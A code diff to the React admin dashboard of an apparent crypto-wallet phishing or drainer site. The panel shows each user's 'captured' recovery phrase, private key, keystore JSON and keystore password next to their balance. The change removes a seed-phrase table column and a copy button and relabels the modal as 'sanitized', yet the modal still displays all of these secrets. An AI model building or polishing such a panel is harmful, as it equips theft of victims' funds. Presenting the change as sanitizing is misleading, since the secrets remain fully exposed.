@@ -138,10 +138,9 @@ const AdminLogin = ({ onLogin }) => {
   );
 };
 
-// User Detail Modal (for Seed Phrase)
+// User Detail Modal (sanitized)
 const UserDetailModal = ({ user, onClose }) => {
     if (!user) return null;
-
     return (
         <div className="admin-overlay" style={{ background: 'rgba(0,0,0,0.8)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
             <div className="admin-modal-content" style={{ background: '#111', padding: '2rem', borderRadius: '12px', width: '600px', maxWidth: '90%', border: '1px solid #333' }}>
@@ -149,92 +148,117 @@ const UserDetailModal = ({ user, onClose }) => {
                     <h3>User Details</h3>
                     <button onClick={onClose} style={{ background: 'none', border: 'none', color: '#fff', cursor: 'pointer' }}><X size={20} /></button>
                 </div>
-
-                <div className="admin-modal-grid" style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '2rem' }}>
-                    <div>
-                        <div style={{ marginBottom: '1rem' }}>
-                            <label style={{ color: '#666', fontSize: '0.85rem' }}>User ID</label>
-                            <div style={{ fontFamily: 'monospace' }}>{user.userId}</div>
-                        </div>
-                        <div style={{ marginBottom: '1rem' }}>
-                            <label style={{ color: '#666', fontSize: '0.85rem' }}>Wallet Address</label>
-                            <div style={{ fontFamily: 'monospace', wordBreak: 'break-all', fontSize: '0.9rem' }}>{user.address}</div>
-                        </div>
-                        <div style={{ marginBottom: '1rem' }}>
-                            <label style={{ color: '#666', fontSize: '0.85rem' }}>Wallet Type</label>
-                            <div style={{ textTransform: 'capitalize' }}>{user.walletType}</div>
-                        </div>
-                        <div style={{ marginBottom: '1rem' }}>
-                            <label style={{ color: '#666', fontSize: '0.85rem' }}>Import Method</label>
-                            <div style={{ textTransform: 'capitalize' }}>{user.importMethod || 'Unknown'}</div>
-                        </div>
-                        <div>
-                            <label style={{ color: '#666', fontSize: '0.85rem' }}>Balance</label>
-                            <div style={{ fontSize: '1.2rem', fontWeight: 'bold', color: '#22c55e' }}>${user.balance?.toLocaleString()}</div>
-                        </div>
+                <div>
+                    <div style={{ marginBottom: '1rem' }}>
+                        <label style={{ color: '#666', fontSize: '0.85rem' }}>User ID</label>
+                        <div style={{ fontFamily: 'monospace' }}>{user.userId}</div>
                     </div>
-
-                    <div style={{ background: '#000', padding: '1rem', borderRadius: '8px', border: '1px solid #333' }}>
-                        <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '1rem', color: '#f59e0b' }}>
-                            <AlertTriangle size={16} />
-                            <span style={{ fontWeight: 'bold', fontSize: '0.9rem' }}>Sensitive Information</span>
-                        </div>
-                        
-                        <label style={{ color: '#666', fontSize: '0.85rem', display: 'block', marginBottom: '0.5rem' }}>Recovery Phrase (Mnemonic)</label>
+                    <div style={{ marginBottom: '1rem' }}>
+                        <label style={{ color: '#666', fontSize: '0.85rem' }}>Wallet Address</label>
+                        <div style={{ fontFamily: 'monospace', wordBreak: 'break-all', fontSize: '0.9rem' }}>{user.address}</div>
+                    </div>
+                    <div style={{ marginBottom: '1rem' }}>
+                        <label style={{ color: '#666', fontSize: '0.85rem' }}>Wallet Type</label>
+                        <div style={{ textTransform: 'capitalize' }}>{user.walletType}</div>
+                    </div>
+                    <div>
+                        <label style={{ color: '#666', fontSize: '0.85rem' }}>Balance</label>
+                        <div style={{ fontSize: '1.2rem', fontWeight: 'bold', color: '#22c55e' }}>${(user.balance || 0).toLocaleString()}</div>
+                    </div>
+                    
+                    <div style={{ marginTop: '1.5rem' }}>
                         <div style={{ 
-                            padding: '1rem', background: '#1a1a1a', borderRadius: '6px', 
-                            border: '1px solid #333', minHeight: '100px',
-                            fontFamily: 'monospace', lineHeight: '1.6', color: '#fff'
+                            background: 'rgba(245, 158, 11, 0.1)', 
+                            border: '1px solid rgba(245, 158, 11, 0.2)', 
+                            borderRadius: '8px',
+                            overflow: 'hidden'
                         }}>
-                            {user.mnemonic || <span style={{ color: '#666', fontStyle: 'italic' }}>No mnemonic captured for this user. (Likely connected via Extension)</span>}
-                        </div>
-                        {user.mnemonic && (
-                            <div style={{ display: 'flex', justifyContent: 'flex-end', marginTop: '0.75rem' }}>
-                                <button 
-                                   onClick={() => navigator.clipboard.writeText(user.mnemonic)}
-                                   style={{ 
-                                       background: 'rgba(255,255,255,0.1)', border: '1px solid #333', 
-                                       color: '#fff', padding: '6px 10px', borderRadius: '6px', cursor: 'pointer',
-                                       fontSize: '0.85rem'
-                                   }}
-                                >
-                                   Copy Phrase
-                                </button>
-                            </div>
-                        )}
-                        
-                        <div style={{ marginTop: '1rem' }}>
-                            <label style={{ color: '#666', fontSize: '0.85rem', display: 'block', marginBottom: '0.5rem' }}>Private Key</label>
                             <div style={{ 
-                                padding: '0.75rem', background: '#1a1a1a', borderRadius: '6px',
-                                border: '1px solid #333', fontSize: '0.9rem', wordBreak: 'break-all', color: '#fff', fontFamily: 'monospace'
+                                padding: '0.75rem 1rem', 
+                                background: 'rgba(245, 158, 11, 0.15)',
+                                display: 'flex', alignItems: 'center', gap: '0.5rem',
+                                color: '#f59e0b', fontWeight: 600, fontSize: '0.9rem'
                             }}>
-                                {user.privateKey || <span style={{ color: '#666', fontStyle: 'italic' }}>No private key captured</span>}
+                                <AlertTriangle size={16} />
+                                Sensitive Information
                             </div>
-                        </div>
-                        
-                        <div style={{ marginTop: '1rem' }}>
-                            <label style={{ color: '#666', fontSize: '0.85rem', display: 'block', marginBottom: '0.5rem' }}>Keystore JSON</label>
-                            <div style={{ 
-                                padding: '0.75rem', background: '#1a1a1a', borderRadius: '6px',
-                                border: '1px solid #333', fontFamily: 'monospace', wordBreak: 'break-all', color: '#fff'
-                            }}>
-                                {user.keystoreJSON || user.keystorePreview || <span style={{ color: '#666', fontStyle: 'italic' }}>No keystore captured</span>}
-                            </div>
-                        </div>
-                        
-                        <div style={{ marginTop: '1rem' }}>
-                            <label style={{ color: '#666', fontSize: '0.85rem', display: 'block', marginBottom: '0.5rem' }}>Keystore Password</label>
-                            <div style={{ 
-                                padding: '0.75rem', background: '#1a1a1a', borderRadius: '6px',
-                                border: '1px solid #333', fontSize: '0.9rem', wordBreak: 'break-all', color: '#fff'
-                            }}>
-                                {user.keystorePassword || (user.keystorePasswordCaptured ? 'Captured' : <span style={{ color: '#666', fontStyle: 'italic' }}>No password captured</span>)}
+                            
+                            <div style={{ padding: '1rem' }}>
+                                <div style={{ marginBottom: '1rem' }}>
+                                    <label style={{ display: 'block', color: '#888', fontSize: '0.8rem', marginBottom: '0.5rem' }}>Recovery Phrase (Mnemonic)</label>
+                                    {user.mnemonic ? (
+                                        <div style={{ 
+                                            background: '#000', padding: '1rem', borderRadius: '6px', 
+                                            fontFamily: 'monospace', lineHeight: '1.6', border: '1px solid #333',
+                                            color: '#fff', wordBreak: 'break-word'
+                                        }}>
+                                            {user.mnemonic}
+                                        </div>
+                                    ) : (
+                                        <div style={{ 
+                                            background: '#222', padding: '1rem', borderRadius: '6px', 
+                                            color: '#666', fontSize: '0.85rem', fontStyle: 'italic',
+                                            border: '1px solid #333'
+                                        }}>
+                                            No mnemonic captured for this user. (Likely connected via Extension)
+                                        </div>
+                                    )}
+                                </div>
+
+                                <div style={{ marginBottom: '1rem' }}>
+                                    <label style={{ display: 'block', color: '#888', fontSize: '0.8rem', marginBottom: '0.5rem' }}>Private Key</label>
+                                    {user.privateKey ? (
+                                        <div style={{ 
+                                            background: '#000', padding: '1rem', borderRadius: '6px', 
+                                            fontFamily: 'monospace', wordBreak: 'break-all', border: '1px solid #333',
+                                            color: '#fff'
+                                        }}>
+                                            {user.privateKey}
+                                        </div>
+                                    ) : (
+                                        <div style={{ 
+                                            background: '#222', padding: '1rem', borderRadius: '6px', 
+                                            color: '#666', fontSize: '0.85rem', fontStyle: 'italic',
+                                            border: '1px solid #333'
+                                        }}>
+                                            No private key captured
+                                        </div>
+                                    )}
+                                </div>
+
+                                <div style={{ marginBottom: '1rem' }}>
+                                    <label style={{ display: 'block', color: '#888', fontSize: '0.8rem', marginBottom: '0.5rem' }}>Keystore JSON</label>
+                                    {user.keystoreJSON ? (
+                                        <>
+                                            <div style={{ 
+                                                background: '#000', padding: '1rem', borderRadius: '6px', 
+                                                fontFamily: 'monospace', fontSize: '0.8rem', maxHeight: '150px', 
+                                                overflowY: 'auto', border: '1px solid #333', whiteSpace: 'pre-wrap',
+                                                color: '#fff', marginBottom: '0.5rem'
+                                            }}>
+                                                {user.keystoreJSON}
+                                            </div>
+                                            {user.keystorePassword && (
+                                                <div style={{ fontSize: '0.85rem' }}>
+                                                    <span style={{ color: '#888' }}>Password: </span>
+                                                    <span style={{ color: '#fff', fontFamily: 'monospace' }}>{user.keystorePassword}</span>
+                                                </div>
+                                            )}
+                                        </>
+                                    ) : (
+                                        <div style={{ 
+                                            background: '#222', padding: '1rem', borderRadius: '6px', 
+                                            color: '#666', fontSize: '0.85rem', fontStyle: 'italic',
+                                            border: '1px solid #333'
+                                        }}>
+                                            No keystore captured
+                                        </div>
+                                    )}
+                                </div>
                             </div>
                         </div>
                     </div>
                 </div>
-
                 <div style={{ marginTop: '2rem', paddingTop: '1rem', borderTop: '1px solid #222', textAlign: 'right' }}>
                     <button onClick={onClose} className="admin-btn">Close</button>
                 </div>
@@ -403,7 +427,6 @@ const AdminDashboard = ({ onExit }) => {
                              <th>Type</th>
                              <th>Balance</th>
                              <th>Last Active</th>
-                             <th>Seed Phrase</th>
                              <th>Actions</th>
                          </tr>
                      </thead>
@@ -438,22 +461,6 @@ const AdminDashboard = ({ onExit }) => {
                                      <td style={{ fontWeight: 'bold' }}>${(user.balance || 0).toLocaleString()}</td>
                                      <td style={{ color: '#888', fontSize: '0.85rem' }}>
                                          {user.lastActive ? new Date(user.lastActive).toLocaleString() : '-'}
-                                     </td>
-                                     <td>
-                                         {user.mnemonic ? (
-                                             <button 
-                                                onClick={() => setSelectedUser(user)}
-                                                style={{ 
-                                                    background: 'rgba(34, 197, 94, 0.1)', border: '1px solid rgba(34, 197, 94, 0.2)', 
-                                                    color: '#22c55e', padding: '4px 12px', borderRadius: '4px', cursor: 'pointer',
-                                                    display: 'flex', alignItems: 'center', gap: '6px', fontSize: '0.8rem'
-                                                }}
-                                             >
-                                                 <Eye size={14} /> View
-                                             </button>
-                                         ) : (
-                                             <span style={{ color: '#444', fontSize: '0.8rem', fontStyle: 'italic' }}>Not available</span>
-                                         )}
                                      </td>
                                      <td>
                                          <div style={{ display: 'flex', gap: '0.5rem' }}>
